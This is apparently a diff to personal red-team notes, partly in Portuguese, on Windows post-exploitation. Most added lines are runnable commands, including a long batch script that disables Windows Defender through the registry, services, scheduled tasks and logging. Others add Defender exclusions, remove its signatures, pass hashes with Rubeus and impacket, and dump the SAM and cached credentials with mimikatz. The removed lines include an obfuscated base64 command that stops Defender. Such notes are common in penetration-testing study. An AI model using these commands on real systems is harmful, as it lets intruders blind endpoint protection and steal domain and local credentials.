@@ -134,23 +134,17 @@ REFS:
 - https://github.com/gentilkiwi/mimikatz/wiki
 
 
-#### Disabling Windows Defender
+#### Disabling Windows Defender(some examples from attack reports)
 
-- Stop Windows Defender from executing on Startup
+- https://github.com/pgkt04/defender-control
+- https://github.com/ionuttbara/windows-defender-remover
+
+- schedule staks + powershell to disable Defender
 ```
-powershell -command "$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA'+'G4ARA B'+'lAGYA'+'ZQB'+'uAG'+'QA'));Stop-Service -Name $x;Set-Service -StartupType Disabled $x"
-```
-
-Disabling antivirus and anti-spyware protections via the HKLM\SOFTWARE\MICROSOFT\WINDOWS DEFENDER registry key and adding the value “*.exe” to the HKLM\SOFTWARE\MICROSOFT\WINDOWS DEFENDER\EXCLUSIONS\EXTENSIONS registry key.
-
-
-> reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
-
-```
-schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f
-schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenanca" /f
-schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f
-schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f
+schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /disable
+schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenanca" /disable
+schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /disable
+schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /disable
 
 Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableArchiveScanning $true
@@ -160,16 +154,113 @@ Set-MpPreference -DisableIntrusionPreventionSystem $true
 Set-MpPreference -DisableScanningNetworkFiles $true
 Set-MpPreference -MAPSReporting 0
 Set-MpPreference -DisableCatchupFullScan $True
+Set-MpPreference -DisableCatchupQuickScan $True
 ```
 
-- https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/#c06
+- adding exclusions
+```
+Add-MpPreference -ExclusionExtension ".exe"
+Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+Set-MpPreference -ExclusionProcess "explorer.exe", "cmd.exe", "powershell.exe"
+
+> reg.exe ADD \"HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths\" /f /t REG_DWORD /v \"C:\ProgramData\Microsoft\Oweboiqnb\" /d \"0\"
+> reg.exe ADD \"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\" /f /t REG_DWORD /v \"C:\ProgramData\Microsoft\Oweboiqnb\" /d \"0\"
+```
+
+- remove dynamically downloaded definitions or signature files used to detect malware.
+```
+%ProgramFiles%\Windows
+Defender\MpCmdRun.exe -removedefinitions -dynamicsignatures
+```
+
+- quick-disable-windows-defender
+- http://web.archive.org/web/20211121135248/https://gist.github.com/anadr/7465a9fde63d41341136949f14c21105
+```
+rem USE AT OWN RISK AS IS WITHOUT WARRANTY OF ANY KIND !!!!!
+rem https://technet.microsoft.com/en-us/itpro/powershell/windows/defender/set-mppreference
+rem To also disable Windows Defender Security Center include this
+rem reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
+rem 1 - Disable Real-time protection
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f
+rem 0 - Disable Logging
+reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
+reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
+rem Disable WD Tasks
+schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
+rem Disable WD systray icon
+reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "Windows Defender" /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /f
+reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f
+rem Remove WD context menu
+reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
+reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
+reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
+rem Disable WD services
+rem For these to execute successfully, you may need to boot into safe mode due to tamper protect
+reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
+rem added the following on 07/25/19 for win10v1903
+reg add "HKLM\System\CurrentControlSet\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f
+reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
+```
 
 
 #### Cheatsheet commands
 
+- overpass the hash (a.k.a pass the key)
+
+```
+- get ntlm hash
+ mimikatz sekurlsa::ekeys
+
+- get tgt with ntlm
+> .\Rubeus.exe asktgt /domain:domain.local /user:administrator /rc4:5b38382017f8c0ac215895d5f9aacac4 /ptt /nowrap
+
+- get tgt with aes key
+> .\Rubeus.exe asktgt /domain:domain.local /user:administrator /aes:<AES-KEY> /nowrap /opsec
+
+
+- or with impacket getTGT 
+> getTGT.py -dc-ip 172.16.1.5 domain.local/administrator -hashes :5b38382017f8c0ac215895d5f9aacac4
+
+
+- crto opth
+```
+
+- cached credentials
+```
+mimikatz # lsadump::cache
+
+- no ntlm hash
+- to crack transoform in hash format $DCC2$<iterations>#<username>#<hash>
+```
+
+
 - dump registry hives (admin access)
 
 ```
+- offline method
+
 > reg save HKLM\SAM C:\path\to\output\sam.hiv
 > reg save HKLM\SYSTEM C:\path\to\output\system.hiv
 > reg save HKLM\SECURITY C:\path\to\output\security.hiv
@@ -177,6 +268,11 @@ Set-MpPreference -DisableCatchupFullScan $True
 impacket-secretsdump -sam C:\sam.hiv -system C:\system.hiv local
 
 mimikatz # lsadump::sam /sam:C:\sam.hiv /system:C:\system.hiv
+
+
+- online method
+
+mimikatz # lsadump::sam
 ```
 
 - Lsa Dump 
@@ -259,6 +355,9 @@ mimikatz # sekurlsa::credman
 - histórico e cookies do navegador: https://github.com/sekirkity/BrowserGather 
 
 - A tool SessionGopher (https://github.com/fireeye/SessionGopher) pode pegar hostnames e senhas salvas do WinSCP, PuTTY, SuperPuTTY, FileZilla, e Microsoft Remote Desktop.
+
+- InternalMonologue tool (Retrieving NTLM Hashes without Touching LSASS) https://github.com/eladshamir/Internal-Monologue
+
 
 
 #### Conforme eu for achando e testando tecnicas e tools novas vou atualizar aqui.
